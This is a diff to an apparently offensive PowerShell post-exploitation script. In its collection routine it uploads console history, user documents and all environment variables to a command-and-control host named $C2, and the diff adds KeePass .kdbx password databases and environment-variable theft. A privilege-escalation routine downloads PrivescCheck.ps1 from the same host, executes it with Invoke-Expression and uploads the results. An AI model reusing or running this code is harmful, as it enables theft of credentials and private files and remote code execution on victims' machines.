@@ -102,7 +102,7 @@ function Invoke-Collection {
 
     if ($histPath -and (Test-Path $histPath)) {
         try {
-            $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue
+            $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue | Out-String
             if ($psHist) {
                 Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "ConsoleHost_history_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
             }
@@ -112,7 +112,7 @@ function Invoke-Collection {
     # ----------------------------------------
     # Collect user files and exfiltrate
     # ----------------------------------------
-    $extensions = '*.txt','*.pdf','*.xls','*.xlsx','*.doc','*.docx','*.ini'
+    $extensions = '*.txt','*.pdf','*.xls','*.xlsx','*.doc','*.docx','*.ini','*.kdbx'
     try {
         $files = Get-ChildItem -Path "C:\Users\" -Include $extensions -File -Recurse -ErrorAction SilentlyContinue
         foreach ($file in $files) {
@@ -124,6 +124,16 @@ function Invoke-Collection {
         }
     } catch {
         Write-Host "Error while enumerating files: $_" -ForegroundColor Yellow
+    }
+
+    # ----------------------------------------
+    # Collect environment
+    # ----------------------------------------
+    try {
+        $envVar = ls env: | Out-String
+        Invoke-FileUpload -C2 $C2 -InputString $envVar -FileName "Env_vars_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
+    } catch {
+        Write-Host "Error while enumerating environment: $_" -ForegroundColor Yellow
     }
 }
 
@@ -174,10 +184,10 @@ function Invoke-PrivEsc {
     # ----------------------------------------
     $privCheck = (New-Object Net.WebClient).DownloadString("http://$($C2)/PrivescCheck.ps1")
     Invoke-Expression $privCheck
-    $privCheckHtml = Join-Path $tmp "PrivescCheck_$($env:COMPUTERNAME)"
+    $privCheckHtml = Join-Path $tmp "PrivescCheck_$($env:COMPUTERNAME)_$($env:USERNAME).html"
     $privCheckOutput = Invoke-PrivescCheck -Extended -Report $privCheckHtml -Format HTML | Out-String
     Invoke-FileUpload -C2 $C2 -InputString $privCheckOutput -FileName "PrivescCheck_$($env:COMPUTERNAME)_$($env:USERNAME).txt" | Out-Null
-    Invoke-FileUpload -C2 $C2 -FilePath "$privCheckHtml.html" | Out-Null
+    Invoke-FileUpload -C2 $C2 -FilePath $privCheckHtml | Out-Null
 
     # ----------------------------------------
     # Cleanup
